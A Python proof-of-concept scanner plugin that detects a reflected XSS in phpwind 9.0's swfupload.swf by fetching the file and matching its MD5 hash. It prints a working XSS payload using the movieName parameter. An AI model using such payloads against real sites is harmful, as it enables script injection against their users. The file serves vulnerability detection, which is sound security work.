#!/usr/bin/python
# coding=utf-8
# @Date    : 2015-06-28
# @Author  : xyw55 (xyw5255@163.com)

'''
phpwind 9.0 /res/js/dev/util_libs/swfupload/Flash/swfupload.swf xss漏洞 POC
refer : http://wooyun.org/bugs/wooyun-2013-017731
'''

import md5


def assign(service, arg):
    if service == "phpwind":
        return True, arg

def audit(arg):
    flash_md5 = "3a1c6cc728dddc258091a601f28a9c12"
    file_path = "/res/js/dev/util_libs/swfupload/Flash/swfupload.swf"
    url = arg
    verify_url = url + file_path

    code, head, res, errcode, _ = curl.curl(verify_url)
    if code == 200:
        md5_value = md5.new(res).hexdigest()
        if md5_value in flash_md5:
            security_info(url + ' phpwind Reflected XSS; plaload: /res/js/dev/util_libs/swfupload/Flash/swfupload.swf?movieName="])}catch(e){alert(1)}//')


if __name__ == '__main__':
    from dummy import *
    audit(assign('phpwind', 'http://192.168.202.128/phpwind/www')[1])